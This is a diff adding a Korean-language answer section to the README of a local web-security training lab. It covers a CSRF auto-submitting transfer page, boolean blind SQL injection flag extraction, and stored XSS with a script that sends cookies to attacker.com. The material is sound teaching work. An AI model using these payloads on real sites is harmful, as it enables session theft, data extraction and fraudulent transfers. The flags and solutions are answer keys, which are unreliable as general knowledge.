@@ -195,3 +195,200 @@ http://127.0.0.1:5000
 
 ---
 
+---
+
+## 🔍 각 취약점 정답(풀이) 보기
+
+> ⚠️ 이 아래 내용은 **정답 스포일러**입니다.  
+> 수강자에게는 **먼저 직접 풀어보게 한 뒤**, 복습용으로 보여주는 걸 추천합니다.
+
+---
+
+<details>
+  <summary><strong>🧊 CSRF – 송금 CSRF & Base64 FLAG</strong></summary>
+
+### 1) 실습 환경 실행
+
+```bash
+cd CSRF
+python init_db.py      # DB 초기화 (사용자, 게시글, FLAG(Base64) 세팅)
+python app.py          # 서버 실행
+브라우저에서 http://127.0.0.1:5000 접속.
+
+2) 피해자 계정으로 로그인
+예: bob / bob123 로 로그인
+→ 우측 “현재 로그인: bob” 이 보이면 OK.
+
+3) 송금 기능 파라미터 확인
+송금하기 메뉴(/transfer)에서 개발자 도구로 폼 구조 확인:
+
+메서드: POST
+
+URL: /transfer
+
+파라미터: receiver, amount, (정상 폼에는 csrf_token 도 있음)
+
+핵심: 서버는 csrf_token 이 없는 요청도 처리하는 취약한 분기 존재.
+
+4) 공격 페이지(attack.html) 작성
+아무 폴더에 attack.html 생성 후:
+
+html
+코드 복사
+<!doctype html>
+<html>
+<head><meta charset="utf-8"><title>CSRF Attack Demo</title></head>
+<body>
+  <h3>이 페이지가 열리는 순간, 백그라운드에서 은밀하게 송금이 일어납니다.</h3>
+
+  <form id="f"
+        action="http://127.0.0.1:5000/transfer"
+        method="POST">
+    <!-- 공격자는 CSRF 토큰을 모르므로 넣지 않는다 -->
+    <input type="hidden" name="receiver" value="bob">
+    <input type="hidden" name="amount"   value="1000">
+  </form>
+
+  <script>
+    window.onload = function () {
+      document.getElementById('f').submit();
+    };
+  </script>
+</body>
+</html>
+5) 공격 페이지 열기
+bash
+코드 복사
+python -m http.server 8001   # attack.html 있는 폴더에서
+그리고 같은 브라우저에서 (이미 bob으로 로그인된 상태):
+
+http://127.0.0.1:8001/attack.html 접속
+
+→ 자동으로 /transfer 로 POST 가 날아가고, 서버는 CSRF 공격 성공 처리.
+
+6) FLAG(Base64) 확인 & 디코딩
+HallymBank 탭의 결과 페이지에 예를 들어:
+
+text
+코드 복사
+CSRF 공격 성공! FLAG:
+Base64(RkxBR3tDU1JGX0FUVEFDS19TVUNDRVNTfQ==)
+같은 메시지가 뜬다.
+
+터미널에서 Base64 디코딩:
+
+bash
+코드 복사
+python - << 'EOF'
+import base64
+s = "RkxBR3tDU1JGX0FUVEFDS19TVUNDRVNTfQ=="
+print(base64.b64decode(s).decode())
+EOF
+→ 최종 FLAG 예시:
+
+text
+코드 복사
+FLAG{CSRF_ATTACK_SUCCESS}
+</details>
+<details> <summary><strong>🧮 SQL Injection – Boolean 기반 Blind SQLi</strong></summary>
+주의: 실제 문제 세부 구조는 /SQLi 폴더의 코드와 README 를 기준으로 한다.
+아래는 전형적인 풀이 흐름 예시이다.
+
+1) 환경 실행
+bash
+코드 복사
+cd SQLi
+python init_db.py
+python app.py
+http://127.0.0.1:5000 접속 → alice / alice123 등으로 로그인.
+
+2) 취약 지점 찾기
+공지사항/게시판 검색폼 등에서 q 파라미터가
+아래와 같이 직접 SQL 문에 삽입되는 구조를 발견:
+
+sql
+코드 복사
+... WHERE board='notice' AND ( <여기에 q 내용이 들어감> ) ORDER BY ...
+예시 테스트 입력: 1=1, 1=2 → 결과 개수 차이가 나면 Boolean 기반 Blind 가능.
+
+3) Blind SQLi로 FLAG 추출
+DB 안에 flags 테이블이 있다고 가정:
+
+sql
+코드 복사
+(SELECT substr(flag,1,1) FROM flags WHERE id=1) = 'F'
+와 같이 조건을 넣어 두고,
+검색 결과가 나오는지/안 나오는지를 이용해 한 글자씩 알아낸다.
+
+파라미터 예시:
+
+text
+코드 복사
+q=(SELECT substr(flag,1,1) FROM flags)= 'F'
+q=(SELECT substr(flag,2,1) FROM flags)= 'L'
+...
+자동화 스크립트를 쓰면 더 편하지만, 교육용에서는
+1~N 번째 문자에 대해 이분 탐색 or 알파벳 하나씩 대입 →
+FLAG{...} 문자열이 완성되면 문제 해결.
+
+4) 최종 FLAG
+실제 FLAG 값은 /SQLi/init_db.py 의 flags 테이블에만 저장되어 있고,
+
+게시판 글/HTML 어디에도 직접 노출되지 않는다.
+
+Blind SQLi 로 읽어낸 문자열이 최종 FLAG 가 된다.
+
+</details>
+<details> <summary><strong>💥 XSS – 저장형 XSS & 세션 탈취 체험</strong></summary>
+역시 구체 코드는 /XSS 폴더의 app.py / README 를 기준으로 한다.
+여기서는 저장형 XSS 기본 풀이 흐름만 정리했다.
+
+1) 환경 실행
+bash
+코드 복사
+cd XSS
+python init_db.py   # 있다면
+python app.py
+http://127.0.0.1:5000 접속 → victim 혹은 일반 사용자 계정으로 로그인.
+
+2) 취약 입력 지점 찾기
+댓글/게시글 작성 폼에서 내용(content) 이
+서버에서 필터링/이스케이프 없이 곧바로 HTML 로 렌더링 되는 지점 확인:
+
+html
+코드 복사
+<div>
+  {{ post.content }}   <!-- escape 없이 그대로 -->
+</div>
+이 경우 <script>...</script> 같은 태그가 그대로 동작한다.
+
+3) 기본 XSS 페이로드 테스트
+글쓰기/댓글 입력에 다음과 같이 입력:
+
+html
+코드 복사
+<script>alert('XSS');</script>
+→ 글을 다시 볼 때 alert 창이 뜨면 저장형 XSS 성공.
+
+4) (선택) 세션 탈취/FLAG 획득 예시
+문제에 따라 document.cookie 또는 특정 FLAG 값을
+공격자 서버로 전송하는 JS 를 작성할 수 있다:
+
+html
+코드 복사
+<script>
+  // 예: 공격자 서버로 쿠키 전송
+  new Image().src = "http://attacker.com/log?c=" + encodeURIComponent(document.cookie);
+</script>
+혹은, 앱이 특정 페이지에서 FLAG{...} 를 DOM 에 숨겨두었다면,
+자바스크립트로 innerText 를 읽어 alert / 로그 등으로 노출시키게 할 수도 있다.
+
+5) 정답 처리
+XSS 페이로드가 정상 동작하여 FLAG{...} 를 확인하거나,
+
+공격자 서버 로그에서 FLAG/쿠키를 확인하면 문제 해결.
+
+</details> ```
+
+
+
